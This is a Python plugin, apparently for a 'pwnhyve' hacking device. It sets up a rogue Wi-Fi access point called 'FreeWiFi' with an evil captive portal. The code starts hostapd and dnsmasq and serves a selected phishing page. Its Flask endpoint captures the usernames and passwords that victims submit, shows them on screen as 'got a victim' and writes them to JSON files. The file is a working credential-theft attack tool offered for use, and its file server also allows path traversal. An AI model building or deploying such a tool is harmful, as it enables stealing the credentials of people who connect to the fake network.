from flask import Flask, request, abort, send_file, render_template
from subprocess import getoutput
import os, json, datetime, shutil
import threading
import time
from core.plugin import BasePwnhyvePlugin

pulledData = {}

app = Flask(__name__)

@app.route('/', defaults={'req_path': ''}, methods=["GET", "POST"])
@app.route('/<path:req_path>', methods=["GET", "POST"])
def dir_listing(req_path):
    global data
    global console
    if req_path == "get":
        if request.method == "POST":
            data = request.get_data(force=True)

            print("| [{}] [DATA] form request from {}".format(datetime.datetime.now(), request.remote_addr))

            for x in data:
                print("| [+] {}: {}".format(x, data[x]))

            pulledData[request.remote_addr] = data

            console.clearText()
            console.addText("got a victim")
            console.addText("IP: {}".format(request.remote_addr))
            console.addText("U: {}".format(data.get("username", "*blank*")))
            console.addText("P: {}".format(data.get("password", "*blank*")))

            with open("data_{}.json".format(datetime.datetime.now()), "w") as f:
                f.write(json.dumps(pulledData, indent=4))
                f.flush()

            print("\\")
        elif request.method == "GET":
            data = request.args

            print("| [{}] [DATA] form request from {}".format(datetime.datetime.now(), request.remote_addr))

            for x in data:
                print("| [+] {}: {}".format(x, data[x]))

            pulledData[request.remote_addr] = data

            console.clearText()
            console.addText("got a victim")
            console.addText("IP: {}".format(request.remote_addr))
            console.addText("U: {}".format(data.get("username", "*blank*")))
            console.addText("P: {}".format(data.get("password", "*blank*")))

            with open("data_{}.json".format(datetime.datetime.now()), "w") as f:
                f.write(json.dumps(pulledData, indent=4))
                f.flush()

            print("\\")

        return "0"

    BASE_DIR = "/home/kali/pwnhyve/core/evil portal/site/"

    print("BASE: {}".format(BASE_DIR))

    # Joining the base and the requested path
    abs_path = os.path.join(BASE_DIR, req_path)

    print("ABSOLUTE: {}".format(abs_path))

    # Return 404 if path doesn't exist
    if not os.path.exists(abs_path):
        return abort(404)

    # Check if path is a file and serve
    if os.path.isfile(abs_path):
        return send_file(abs_path)

    # if index, return index page
    return open(BASE_DIR+"index.html", encoding="utf-8").read()

class Plugin(BasePwnhyvePlugin):
    def evilPortal(draw, disp, image, GPIO):
        global console
        interface = os.environ.get("evilInterface", "wlan0").strip()
        ssid = os.environ.get("ssid", "FreeWiFi").strip()

        # set page
        page = disp.menu(draw, disp, image, os.listdir("./core/evil portal/pages"), GPIO, caption="select page")
        shutil.copy("./core/evil portal/pages/{}".format(page), "./core/evil portal/site/index.html")
        

        # start console thread
        console = disp.screenConsole(draw, disp, image)
        console.clearText()
        threading.Thread(target=console.start, daemon=True).start()


        # check for dnsmasq and hostapd (both required)
        if "not found" in getoutput("hostapd -v").split("\n")[0]: console.addText("[X] hostapd not found"); return
        if "not found" in getoutput("dnsmasq -v").split("  ")[0]: console.addText("[X] dnsmasq not found"); return
        
        console.addText("setting interface..")

        ### setting the interface down and masking wpa_supplicant way because whoever put it in the kali linux iso
        ### made it restart after every 5 seconds and doesn't let you stop it in any other way other than masking!!!!
        ### AFTER THAT the only way to restart wpa_supplicant is to restart NetworkManager WHICH IS ENTIRELY DIFFERENT
        ### AND HAS BASICALLY NO CORRELEATION WITH EACHOTHER BUT FOR SOME REASON IT DOES
        ### ^ whoever did that and confirmed it i hate you from the bottom of my heart
        ### this also takes a while to start
        getoutput("sudo /usr/bin/ip link set dev {} down")
        getoutput("sudo /usr/bin/systemctl mask wpa_supplicant")
        getoutput("sudo /usr/bin/systemctl stop wpa_supplicant")
        monIface = interface

        # copy configuration files
        a = open("./core/evil portal/configs/hostapd.conf", "r").read()
        with open("/tmp/hostapd.conf", "w") as f:
            f.write(a.replace("%interface%", monIface).replace("%ssid%", ssid))
            f.flush()

        a = open("./core/evil portal/configs/dnsmasq.conf", "r").read()
        with open("/tmp/dnsmasq.conf", "w") as f:
            f.write(a.replace("%interface%", monIface))
            f.flush()

        console.addText("waiting for system...")

        # start hostapd, dnsmasq, flush ip addresses, and set the ip as 10.0.0.1
        os.system("sudo /usr/sbin/hostapd -B /tmp/hostapd.conf")
        os.system("sudo /usr/sbin/dnsmasq -C /tmp/dnsmasq.conf")
        os.system("sudo /usr/bin/ip addr flush dev {}".format(monIface))
        os.system("sudo /usr/bin/ip address add 10.0.0.1/8 dev {}".format(monIface))

        # drop all ssh connections when in ap mode, because someone could bruteforce it
        os.system("sudo /usr/sbin/iptables -A INPUT -i wlan0 -p tcp --dport 22 -j DROP")

        # start the http server
        threading.Thread(target=lambda: app.run(host="0.0.0.0", port=80, debug=True, use_reloader=False)).start()

        ### done w starting everything
        
        console.clearText()
        console.addText("ssid: {}".format(ssid))
        console.addText("interface: {}".format(interface))
        console.addText("page: {}".format(page))
        console.addText("ready   >:)")

        while True:
            time.sleep(0.1)

            if disp.checkIfKey(GPIO):
                console.clearText()
                console.addText("stopping services...")
                
                # stop dnsmasq and hostapd
                os.system("sudo /usr/bin/pkill -f dnsmasq")
                os.system("sudo /usr/bin/pkill -f hostapd")

                # flush all ips AGAIN
                os.system("sudo /usr/bin/ip addr flush dev {}".format(monIface))
                
                # unmask wpa supplicant and restart NWmanager cause they suck
                os.system("sudo /usr/bin/systemctl unmask wpa_supplicant")
                os.system("sudo /usr/bin/systemctl restart NetworkManager")

                # set the itnerface back up
                os.system("sudo /usr/bin/ip link set dev {} up".format(interface))

                # allow ssh again
                os.system("sudo /usr/sbin/iptables -A INPUT -i wlan0 -p tcp --dport 22 -j ACCEPT")

                console.clearText()
                time.sleep(0.25)
                console.exit()
                return
